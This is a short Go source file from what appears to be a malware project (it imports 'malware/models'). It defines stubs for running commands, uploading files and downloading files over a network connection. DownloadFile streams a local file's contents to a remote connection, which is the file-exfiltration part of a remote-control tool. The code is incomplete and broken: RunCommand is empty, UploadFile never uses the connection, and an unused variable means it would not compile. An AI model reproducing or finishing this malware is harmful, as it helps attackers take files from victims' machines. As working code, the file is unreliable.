package core

import (
	"encoding/binary"
	"io"
	"malware/models"
	"net"
	"os"
)

func RunCommand(cmd string) string {
	return ""
}

func UploadFile(conn net.Conn, path string) {
	file, err := os.Create(path)
	if err != nil {
		panic("clould not create the file")
	}
	//binary.Write(file.Stat())
	io.ReadAll(file)
}

func DownloadFile(conn net.Conn, path string) {

	file, err := os.Open(path)
	if err != nil {
		panic(err)
	}
	fileInfo, err := file.Stat()
	if err != nil {
		panic(err)
	}

	fileSize := fileInfo.Size()
	fileName := fileInfo.Name()

	cmd := &models.Command{
		Lenght: fileSize,
		Data:   []byte(fileName),
	}

	// binary.Write(conn, binary.LittleEndian, fileSize)
	
	_, err = io.CopyN(conn, file, fileSize)

	if err != nil {
		panic(err)
	}
}
